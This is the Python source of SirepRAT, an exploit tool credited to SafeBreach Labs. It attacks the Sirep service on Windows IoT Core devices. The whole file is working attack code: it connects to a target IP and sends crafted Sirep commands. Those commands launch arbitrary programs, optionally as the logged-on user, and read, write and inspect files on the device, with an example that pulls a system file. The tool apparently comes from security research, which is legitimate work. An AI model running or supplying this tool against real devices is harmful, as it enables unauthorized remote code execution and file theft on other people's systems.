#!/usr/bin/env python
"""
BSD 3-Clause License

Copyright (c) 2017, SafeBreach Labs
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this
  list of conditions and the following disclaimer.

* Redistributions in binary form must reproduce the above copyright notice,
  this list of conditions and the following disclaimer in the documentation
  and/or other materials provided with the distribution.

* Neither the name of the copyright holder nor the names of its
  contributors may be used to endorse or promote products derived from
  this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.


File:       SirepRAT.py
Purpose:    Exploit Windows IoT Core's Sirep service to execute remote commands on the device
Author:     Dor Azouri <dor.azouri@safebreach.com>
Date:       2018-08-19 08:03:08
"""

import argparse
import logging
import socket
import string
import struct
import sys

import hexdump

from common.constants import SIREP_VERSION_GUID_LEN, LOGGING_FORMAT, LOGGING_LEVEL, SIREP_PORT, INT_SIZE, \
    LOGGING_DATA_TRUNCATION
from common.enums.CommandType import CommandType
from common.mappings import SIREP_COMMANDS, RESULT_TYPE_TO_RESULT

# Initialize logging
logging.basicConfig(format=LOGGING_FORMAT, level=LOGGING_LEVEL)


def get_command_ctor_arguments(sirep_command_type, args):
    command_args = []
    if sirep_command_type == CommandType.LaunchCommandWithOutput:
        command_args = [
            args.return_output,
            args.cmd,
            args.as_logged_on_user,
            args.args,
            args.base_directory
        ]
    elif sirep_command_type == CommandType.PutFileOnDevice:
        command_args = [
            args.remote_path,
            args.data
        ]
    elif sirep_command_type == CommandType.GetFileFromDevice:
        command_args = [
            args.remote_path,
        ]
    elif sirep_command_type == CommandType.GetFileInformationFromDevice:
        command_args = [
            args.remote_path,
        ]
    elif sirep_command_type == CommandType.GetSystemInformationFromDevice:
        pass
    else:
        logging.error("Command type not supported")
    command_args = [arg for arg in command_args if arg is not None]
    return command_args


def sirep_connect(sock, dst_ip, verbose=False):
    # Connect the socket to the port where the server is listening
    server_address = (dst_ip, SIREP_PORT)
    logging.debug('Connecting to %s port %s' % server_address)
    sock.connect(server_address)
    # Receive the server version GUID that acts as the service banner
    version_guid_banner = sock.recv(SIREP_VERSION_GUID_LEN)
    logging.info('Banner hex: %s' % version_guid_banner)
    if verbose:
        print "RECV:"
        hexdump.hexdump(version_guid_banner)


def sirep_send_command(sirep_con_sock, sirep_command, print_printable_data=False, verbose=False):
    # generate the commands's payload
    sirep_payload = sirep_command.serialize_sirep()
    logging.info('Sirep payload hex: %s' % sirep_payload.encode('hex'))
    if verbose:
        print "SEND:"
        hexdump.hexdump(sirep_payload)

    # Send the Sirep payload
    logging.debug("Sending Sirep payload")
    sirep_con_sock.sendall(sirep_payload)

    # Receive all result records
    result_record_type = -1
    records = []
    while True:
        try:
            first_int = sirep_con_sock.recv(0x4)
            if first_int == '':
                break
            result_record_type = int(struct.unpack("I", first_int)[0])
            logging.debug("Result record type: %d" % result_record_type)
            data_size = int(struct.unpack("I", sirep_con_sock.recv(0x4))[0])
            if data_size == 0:
                break

            logging.debug("Receiving %d bytes" % data_size)
            data = sirep_con_sock.recv(data_size)

            logging.info("Result record data hex: %s" % data[:LOGGING_DATA_TRUNCATION].encode('hex'))
            if verbose:
                print "RECV:"
                hexdump.hexdump(data)

            # If printable, print result record data as is
            if print_printable_data and all([x in string.printable for x in data]):
                logging.info("Result data readable print:")
                print "---------\n%s\n---------" % data
            records.append(first_int + data)
        except socket.timeout as e:
            logging.debug("timeout in command communication. Assuming end of conversation")
            break
    return records


def main(args):
    dst_ip = args.target_device_ip
    command_type = args.command_type
    sirep_command_type = getattr(CommandType, command_type)

    try:
        command_args = get_command_ctor_arguments(sirep_command_type, args)
    except:
        logging.error("Wrong usage. use --help for instructions")
        sys.exit()

    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)

    try:
        sirep_command_ctor = SIREP_COMMANDS[sirep_command_type]
        # create the requested sirep command
        try:
            sirep_command = sirep_command_ctor(*command_args)
        except TypeError:
            logging.error("Wrong usage. use --help for instructions")
            sys.exit()
        sirep_connect(sock, dst_ip, verbose=args.vv)
        sirep_result_buffers = sirep_send_command(sock, sirep_command, print_printable_data=args.v or args.vv,
                                                  verbose=args.vv)

        sirep_results = []
        for result_buffer in sirep_result_buffers:
            result_type_code = struct.unpack("I", result_buffer[:INT_SIZE])[0]
            sirep_result_ctor = RESULT_TYPE_TO_RESULT[result_type_code]
            sirep_result = sirep_result_ctor(result_buffer)
            print sirep_result
            sirep_results.append(sirep_result)
    finally:
        logging.debug("Closing socket")
        sock.close()

    return True


if "__main__" == __name__:
    available_command_types = [cmd_type.name for cmd_type in CommandType]
    example_usage = r'Usage example: python SirepRAT.py 192.168.3.17 GetFileFromDevice --remote_path ' \
                    r'C:\Windows\System32\hostname.exe'
    command_types_text_block = "available commands:\n*\t%s\n\n" % "\n*\t".join(available_command_types)
    remarks_text = "\n\nremarks:\n-\tUse moustaches to wrap remote environment variables to expand (e.g. {{" \
                   "userprofile}})\n\n"
    epilog_help_text = command_types_text_block + remarks_text + example_usage
    description_text = "Exploit Windows IoT Core's Sirep service to execute remote commands on the device"

    parser = argparse.ArgumentParser(description=description_text,
                                     usage='%(prog)s target_device_ip command_type [options]',
                                     formatter_class=lambda prog: argparse.RawTextHelpFormatter(prog, width=140),
                                     epilog=epilog_help_text)

    parser.add_argument('target_device_ip', type=str,
                        help="The IP address of the target IoT Core device")
    parser.add_argument('command_type', type=str,
                        choices=available_command_types,
                        help="The Sirep command to use. Available commands are listed below",
                        metavar='command_type')
    parser.add_argument('--return_output', action='store_true', default=False,
                        help="Set to have the target device return the command output stream")
    parser.add_argument('--cmd', type=str,
                        help="Program path to execute")
    parser.add_argument('--as_logged_on_user', action='store_true', default=False,
                        help="Set to impersonate currently logged on user on the target device")
    parser.add_argument('--args', type=str,
                        help="Arguments string for the program")
    parser.add_argument('--base_directory', type=str,
                        help="The working directory from which to run the desired program")
    parser.add_argument('--remote_path', type=str,
                        help="Path on target device")
    parser.add_argument('--data', type=str,
                        help="Data string to write to file")
    parser.add_argument('--v', action='store_true', default=False,
                        help="Verbose - if printable, print result")
    parser.add_argument('--vv', action='store_true', default=False,
                        help="Very verbose - print socket buffers and more")
    
    args = parser.parse_args()

    if args.command_type == CommandType.LaunchCommandWithOutput.name:
        if not args.cmd:
            parser.error('usage: python SirepRAT.py <target_device_ip> LaunchCommandWithOutput --cmd <program_path> ['
                         '--args <arguments_srting>] [--return_output] [--as_logged_on_user]')
    elif args.command_type == CommandType.PutFileOnDevice.name:
        if not args.remote_path:
            parser.error('usage: python SirepRAT.py <target_device_ip> PutFileOnDevice --remote_path '
                         '<remote_destination_path> [--data <data_to_write>]')
    elif args.command_type == CommandType.GetFileFromDevice.name:
        if not args.remote_path:
            parser.error('usage: python SirepRAT.py <target_device_ip> GetFileFromDevice --remote_path <remote_path>')
    elif args.command_type == CommandType.GetFileInformationFromDevice.name:
        if not args.remote_path:
            parser.error('usage: python SirepRAT.py <target_device_ip> GetFileInformationFromDevice --remote_path '
                         '<remote_path>')

    main(args)
